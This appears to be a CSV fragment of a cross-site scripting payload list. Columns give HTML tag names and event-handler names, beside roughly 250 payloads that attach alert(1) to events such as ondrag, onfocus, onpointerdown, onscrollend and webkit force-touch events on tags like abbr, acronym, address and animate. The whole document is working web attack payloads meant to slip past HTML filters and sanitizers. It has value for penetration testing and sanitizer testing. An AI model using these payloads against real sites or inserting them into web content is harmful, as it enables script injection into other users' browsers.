form,onloadedmetadata,"<a2 draggable=""true"" ondrag=""alert(1)"" style=display:block>test</a2>",,
frame,onloadstart,"<a2 draggable=""true"" ondragend=""alert(1)"" style=display:block>test</a2>",,
frameset,onmessage,"<a2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</a2>",,
h1,onmousedown,"<a2 draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</a2>",,
head,onmouseenter,"<a2 draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</a2>",,
header,onmouseleave,"<a2 draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</a2>",,
hgroup,onmousemove,"<a2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></a2>",,
hr,onmouseout,<a2 onafterscriptexecute=alert(1)><script>1</script>,,
html,onmouseover,<a2 onbeforescriptexecute=alert(1)><script>1</script>,,
i,onmouseup,<a2 onblur=alert(1) id=x tabindex=1 style=display:block>test</a2><input value=clickme>,,
iframe,onmousewheel,"<a2 onclick=""alert(1)"" style=display:block>test</a2>",,
iframe2,onmozfullscreenchange,"<a2 oncontextmenu=""alert(1)"" style=display:block>test</a2>",,
image,onpagehide,"<a2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
image2,onpageshow,"<a2 oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
image3,onpaste,"<a2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</a2>",,
img,onpause,<a2 onfocus=alert(1) autofocus tabindex=1>,,
img2,onplay,<a2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</a2><input value=clickme>,,
input,onplaying,"<a2 onkeydown=""alert(1)"" contenteditable style=display:block>test</a2>",,
input2,onpointercancel,"<a2 onkeypress=""alert(1)"" contenteditable style=display:block>test</a2>",,
input3,onpointerdown,"<a2 onkeyup=""alert(1)"" contenteditable style=display:block>test</a2>",,
input4,onpointerenter,"<a2 onmousedown=""alert(1)"" style=display:block>test</a2>",,
ins,onpointerleave,"<a2 onmouseenter=""alert(1)"" style=display:block>test</a2>",,
kbd,onpointermove,"<a2 onmouseleave=""alert(1)"" style=display:block>test</a2>",,
keygen,onpointerout,"<a2 onmousemove=""alert(1)"" style=display:block>test</a2>",,
label,onpointerover,"<a2 onmouseout=""alert(1)"" style=display:block>test</a2>",,
legend,onpointerrawupdate,"<a2 onmouseover=""alert(1)"" style=display:block>test</a2>",,
li,onpointerup,"<a2 onmouseup=""alert(1)"" style=display:block>test</a2>",,
link,onpopstate,<a2 onmousewheel=alert(1) style=display:block>requires scrolling,,
listing,onprogress,<a2 onpointercancel=alert(1)>XSS</a2>,,
main,onratechange,<a2 onpointerdown=alert(1) style=display:block>XSS</a2>,,
map,onrepeat,<a2 onpointerenter=alert(1) style=display:block>XSS</a2>,,
mark,onreset,<a2 onpointerleave=alert(1) style=display:block>XSS</a2>,,
marquee,onresize,<a2 onpointermove=alert(1) style=display:block>XSS</a2>,,
menu,onscroll,<a2 onpointerout=alert(1) style=display:block>XSS</a2>,,
menuitem,onscrollend,<a2 onpointerover=alert(1) style=display:block>XSS</a2>,,
meta,onsearch,<a2 onpointerrawupdate=alert(1) style=display:block>XSS</a2>,,
meter,onseeked,<a2 onpointerup=alert(1) style=display:block>XSS</a2>,,
multicol,onseeking,"<a2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a2>",,
nav,onselect,<a2 onwebkitmouseforcechanged=alert(1)>XSS</a2>,,
nextid,onselectionchange,<a2 onwebkitmouseforcedown=alert(1)>XSS</a2>,,
nobr,onselectstart,<a2 onwebkitmouseforceup=alert(1)>XSS</a2>,,
noembed,onshow,<a2 onwebkitmouseforcewillbegin=alert(1)>XSS</a2>,,
noframes,onsubmit,<a2 onwebkitwillrevealbottom=alert(1)>XSS</a2>,,
noscript,onsuspend,<abbr contenteditable onbeforeinput=alert(1)>test,,
object,ontimeupdate,"<abbr draggable=""true"" ondrag=""alert(1)"" style=display:block>test</abbr>",,
ol,ontoggle,"<abbr draggable=""true"" ondragend=""alert(1)"" style=display:block>test</abbr>",,
optgroup,ontoggle(popover),"<abbr draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</abbr>",,
option,ontouchend,"<abbr draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</abbr>",,
output,ontouchmove,"<abbr draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</abbr>",,
p,ontouchstart,"<abbr draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</abbr>",,
param,ontransitioncancel,"<abbr id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></abbr>",,
picture,ontransitionend,<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,,
plaintext,ontransitionrun,<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,,
pre,ontransitionstart,<abbr onafterscriptexecute=alert(1)><script>1</script>,,
progress,onunhandledrejection,"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",,
q,onunload,"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",,
rb,onvolumechange,<abbr onbeforescriptexecute=alert(1)><script>1</script>,,
rp,onwebkitanimationend,<abbr onblur=alert(1) id=x tabindex=1 style=display:block>test</abbr><input value=clickme>,,
rt,onwebkitanimationiteration,"<abbr onclick=""alert(1)"" style=display:block>test</abbr>",,
rtc,onwebkitanimationstart,"<abbr oncontextmenu=""alert(1)"" style=display:block>test</abbr>",,
ruby,onwebkitmouseforcechanged,"<abbr oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
s,onwebkitmouseforcedown,"<abbr oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
samp,onwebkitmouseforceup,"<abbr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</abbr>",,
script,onwebkitmouseforcewillbegin,<abbr onfocus=alert(1) autofocus tabindex=1>,,
section,onwebkitplaybacktargetavailabilitychanged,<abbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</abbr><input value=clickme>,,
select,onwebkittransitionend,"<abbr onkeydown=""alert(1)"" contenteditable style=display:block>test</abbr>",,
set,onwebkitwillrevealbottom,"<abbr onkeypress=""alert(1)"" contenteditable style=display:block>test</abbr>",,
shadow,onwheel,"<abbr onkeyup=""alert(1)"" contenteditable style=display:block>test</abbr>",,
slot,,"<abbr onmousedown=""alert(1)"" style=display:block>test</abbr>",,
small,,"<abbr onmouseenter=""alert(1)"" style=display:block>test</abbr>",,
source,,"<abbr onmouseleave=""alert(1)"" style=display:block>test</abbr>",,
spacer,,"<abbr onmousemove=""alert(1)"" style=display:block>test</abbr>",,
span,,"<abbr onmouseout=""alert(1)"" style=display:block>test</abbr>",,
strike,,"<abbr onmouseover=""alert(1)"" style=display:block>test</abbr>",,
strong,,"<abbr onmouseup=""alert(1)"" style=display:block>test</abbr>",,
style,,<abbr onmousewheel=alert(1) style=display:block>requires scrolling,,
sub,,"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",,
summary,,<abbr onpointercancel=alert(1)>XSS</abbr>,,
sup,,<abbr onpointerdown=alert(1) style=display:block>XSS</abbr>,,
svg,,<abbr onpointerenter=alert(1) style=display:block>XSS</abbr>,,
table,,<abbr onpointerleave=alert(1) style=display:block>XSS</abbr>,,
tbody,,<abbr onpointermove=alert(1) style=display:block>XSS</abbr>,,
td,,<abbr onpointerout=alert(1) style=display:block>XSS</abbr>,,
template,,<abbr onpointerover=alert(1) style=display:block>XSS</abbr>,,
textarea,,<abbr onpointerrawupdate=alert(1) style=display:block>XSS</abbr>,,
tfoot,,<abbr onpointerup=alert(1) style=display:block>XSS</abbr>,,
th,,"<abbr onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></abbr>",,
thead,,<abbr onwebkitmouseforcechanged=alert(1)>XSS</abbr>,,
time,,<abbr onwebkitmouseforcedown=alert(1)>XSS</abbr>,,
title,,<abbr onwebkitmouseforceup=alert(1)>XSS</abbr>,,
tr,,<abbr onwebkitmouseforcewillbegin=alert(1)>XSS</abbr>,,
track,,<abbr onwebkitwillrevealbottom=alert(1)>XSS</abbr>,,
tt,,<acronym contenteditable onbeforeinput=alert(1)>test,,
u,,"<acronym draggable=""true"" ondrag=""alert(1)"" style=display:block>test</acronym>",,
ul,,"<acronym draggable=""true"" ondragend=""alert(1)"" style=display:block>test</acronym>",,
var,,"<acronym draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</acronym>",,
video,,"<acronym draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</acronym>",,
video2,,"<acronym draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</acronym>",,
wbr,,"<acronym draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</acronym>",,
xmp,,"<acronym id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></acronym>",,
,,<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,,
,,<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,,
,,<acronym onafterscriptexecute=alert(1)><script>1</script>,,
,,"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",,
,,"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",,
,,<acronym onbeforescriptexecute=alert(1)><script>1</script>,,
,,<acronym onblur=alert(1) id=x tabindex=1 style=display:block>test</acronym><input value=clickme>,,
,,"<acronym onclick=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym oncontextmenu=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<acronym oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<acronym ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</acronym>",,
,,<acronym onfocus=alert(1) autofocus tabindex=1>,,
,,<acronym onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</acronym><input value=clickme>,,
,,"<acronym onkeydown=""alert(1)"" contenteditable style=display:block>test</acronym>",,
,,"<acronym onkeypress=""alert(1)"" contenteditable style=display:block>test</acronym>",,
,,"<acronym onkeyup=""alert(1)"" contenteditable style=display:block>test</acronym>",,
,,"<acronym onmousedown=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym onmouseenter=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym onmouseleave=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym onmousemove=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym onmouseout=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym onmouseover=""alert(1)"" style=display:block>test</acronym>",,
,,"<acronym onmouseup=""alert(1)"" style=display:block>test</acronym>",,
,,<acronym onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",,
,,<acronym onpointercancel=alert(1)>XSS</acronym>,,
,,<acronym onpointerdown=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointerenter=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointerleave=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointermove=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointerout=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointerover=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointerrawupdate=alert(1) style=display:block>XSS</acronym>,,
,,<acronym onpointerup=alert(1) style=display:block>XSS</acronym>,,
,,"<acronym onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></acronym>",,
,,<acronym onwebkitmouseforcechanged=alert(1)>XSS</acronym>,,
,,<acronym onwebkitmouseforcedown=alert(1)>XSS</acronym>,,
,,<acronym onwebkitmouseforceup=alert(1)>XSS</acronym>,,
,,<acronym onwebkitmouseforcewillbegin=alert(1)>XSS</acronym>,,
,,<acronym onwebkitwillrevealbottom=alert(1)>XSS</acronym>,,
,,<address contenteditable onbeforeinput=alert(1)>test,,
,,"<address draggable=""true"" ondrag=""alert(1)"" style=display:block>test</address>",,
,,"<address draggable=""true"" ondragend=""alert(1)"" style=display:block>test</address>",,
,,"<address draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</address>",,
,,"<address draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</address>",,
,,"<address draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</address>",,
,,"<address draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</address>",,
,,"<address id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></address>",,
,,<address id=x tabindex=1 onfocus=alert(1)></address>,,
,,<address id=x tabindex=1 onfocusin=alert(1)></address>,,
,,<address onafterscriptexecute=alert(1)><script>1</script>,,
,,"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",,
,,"<address onbeforecut=""alert(1)"" contenteditable>test</address>",,
,,<address onbeforescriptexecute=alert(1)><script>1</script>,,
,,<address onblur=alert(1) id=x tabindex=1 style=display:block>test</address><input value=clickme>,,
,,"<address onclick=""alert(1)"" style=display:block>test</address>",,
,,"<address oncontextmenu=""alert(1)"" style=display:block>test</address>",,
,,"<address oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<address oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<address ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</address>",,
,,<address onfocus=alert(1) autofocus tabindex=1>,,
,,<address onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</address><input value=clickme>,,
,,"<address onkeydown=""alert(1)"" contenteditable style=display:block>test</address>",,
,,"<address onkeypress=""alert(1)"" contenteditable style=display:block>test</address>",,
,,"<address onkeyup=""alert(1)"" contenteditable style=display:block>test</address>",,
,,"<address onmousedown=""alert(1)"" style=display:block>test</address>",,
,,"<address onmouseenter=""alert(1)"" style=display:block>test</address>",,
,,"<address onmouseleave=""alert(1)"" style=display:block>test</address>",,
,,"<address onmousemove=""alert(1)"" style=display:block>test</address>",,
,,"<address onmouseout=""alert(1)"" style=display:block>test</address>",,
,,"<address onmouseover=""alert(1)"" style=display:block>test</address>",,
,,"<address onmouseup=""alert(1)"" style=display:block>test</address>",,
,,<address onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<address onpaste=""alert(1)"" contenteditable>test</address>",,
,,<address onpointercancel=alert(1)>XSS</address>,,
,,<address onpointerdown=alert(1) style=display:block>XSS</address>,,
,,<address onpointerenter=alert(1) style=display:block>XSS</address>,,
,,<address onpointerleave=alert(1) style=display:block>XSS</address>,,
,,<address onpointermove=alert(1) style=display:block>XSS</address>,,
,,<address onpointerout=alert(1) style=display:block>XSS</address>,,
,,<address onpointerover=alert(1) style=display:block>XSS</address>,,
,,<address onpointerrawupdate=alert(1) style=display:block>XSS</address>,,
,,<address onpointerup=alert(1) style=display:block>XSS</address>,,
,,"<address onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></address>",,
,,<address onwebkitmouseforcechanged=alert(1)>XSS</address>,,
,,<address onwebkitmouseforcedown=alert(1)>XSS</address>,,
,,<address onwebkitmouseforceup=alert(1)>XSS</address>,,
,,<address onwebkitmouseforcewillbegin=alert(1)>XSS</address>,,
,,<address onwebkitwillrevealbottom=alert(1)>XSS</address>,,
,,<animate contenteditable onbeforeinput=alert(1)>test,,
,,"<animate draggable=""true"" ondrag=""alert(1)"" style=display:block>test</animate>",,
,,"<animate draggable=""true"" ondragend=""alert(1)"" style=display:block>test</animate>",,
,,"<animate draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</animate>",,
,,"<animate draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</animate>",,
,,"<animate draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</animate>",,
,,"<animate draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</animate>",,
,,"<animate id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animate>",,
,,<animate onafterscriptexecute=alert(1)><script>1</script>,,
,,<animate onbeforescriptexecute=alert(1)><script>1</script>,,
,,<animate onblur=alert(1) id=x tabindex=1 style=display:block>test</animate><input value=clickme>,,
,,"<animate onclick=""alert(1)"" style=display:block>test</animate>",,
,,"<animate oncontextmenu=""alert(1)"" style=display:block>test</animate>",,
,,"<animate oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<animate oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<animate ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</animate>",,
,,<animate onfocus=alert(1) autofocus tabindex=1>,,
,,<animate onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animate><input value=clickme>,,
,,"<animate onkeydown=""alert(1)"" contenteditable style=display:block>test</animate>",,
,,"<animate onkeypress=""alert(1)"" contenteditable style=display:block>test</animate>",,
,,"<animate onkeyup=""alert(1)"" contenteditable style=display:block>test</animate>",,
,,"<animate onmousedown=""alert(1)"" style=display:block>test</animate>",,
,,"<animate onmouseenter=""alert(1)"" style=display:block>test</animate>",,
,,"<animate onmouseleave=""alert(1)"" style=display:block>test</animate>",,
,,"<animate onmousemove=""alert(1)"" style=display:block>test</animate>",,
,,"<animate onmouseout=""alert(1)"" style=display:block>test</animate>",,
,,"<animate onmouseover=""alert(1)"" style=display:block>test</animate>",,
,,"<animate onmouseup=""alert(1)"" style=display:block>test</animate>",,
,,<animate onmousewheel=alert(1) style=display:block>requires scrolling,,
,,<animate onpointercancel=alert(1)>XSS</animate>,,
,,<animate onpointerdown=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointerenter=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointerleave=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointermove=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointerout=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointerover=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointerrawupdate=alert(1) style=display:block>XSS</animate>,,
,,<animate onpointerup=alert(1) style=display:block>XSS</animate>,,
,,"<animate onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animate>",,
,,<animate onwebkitmouseforcechanged=alert(1)>XSS</animate>,,
,,<animate onwebkitmouseforcedown=alert(1)>XSS</animate>,,
,,<animate onwebkitmouseforceup=alert(1)>XSS</animate>,,
,,<animate onwebkitmouseforcewillbegin=alert(1)>XSS</animate>,,
,,<animate onwebkitwillrevealbottom=alert(1)>XSS</animate>,,
,,<animatemotion contenteditable onbeforeinput=alert(1)>test,,
,,"<animatemotion draggable=""true"" ondrag=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion draggable=""true"" ondragend=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animatemotion>",,
,,<animatemotion onafterscriptexecute=alert(1)><script>1</script>,,
,,<animatemotion onbeforescriptexecute=alert(1)><script>1</script>,,
,,<animatemotion onblur=alert(1) id=x tabindex=1 style=display:block>test</animatemotion><input value=clickme>,,
,,"<animatemotion onclick=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion oncontextmenu=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<animatemotion oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<animatemotion ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</animatemotion>",,
,,<animatemotion onfocus=alert(1) autofocus tabindex=1>,,
,,<animatemotion onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animatemotion><input value=clickme>,,
,,"<animatemotion onkeydown=""alert(1)"" contenteditable style=display:block>test</animatemotion>",,
,,"<animatemotion onkeypress=""alert(1)"" contenteditable style=display:block>test</animatemotion>",,
,,"<animatemotion onkeyup=""alert(1)"" contenteditable style=display:block>test</animatemotion>",,
,,"<animatemotion onmousedown=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion onmouseenter=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion onmouseleave=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion onmousemove=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion onmouseout=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion onmouseover=""alert(1)"" style=display:block>test</animatemotion>",,
,,"<animatemotion onmouseup=""alert(1)"" style=display:block>test</animatemotion>",,
,,<animatemotion onmousewheel=alert(1) style=display:block>requires scrolling,,
,,<animatemotion onpointercancel=alert(1)>XSS</animatemotion>,,
,,<animatemotion onpointerdown=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointerenter=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointerleave=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointermove=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointerout=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointerover=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointerrawupdate=alert(1) style=display:block>XSS</animatemotion>,,
,,<animatemotion onpointerup=alert(1) style=display:block>XSS</animatemotion>,,
,,"<animatemotion onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animatemotion>",,
,,<animatemotion onwebkitmouseforcechanged=alert(1)>XSS</animatemotion>,,
,,<animatemotion onwebkitmouseforcedown=alert(1)>XSS</animatemotion>,,
,,<animatemotion onwebkitmouseforceup=alert(1)>XSS</animatemotion>,,
,,<animatemotion onwebkitmouseforcewillbegin=alert(1)>XSS</animatemotion>,,
,,<animatemotion onwebkitwillrevealbottom=alert(1)>XSS</animatemotion>,,
,,<animatetransform contenteditable onbeforeinput=alert(1)>test,,
,,"<animatetransform draggable=""true"" ondrag=""alert(1)"" style=display:block>test</animatetransform>",,
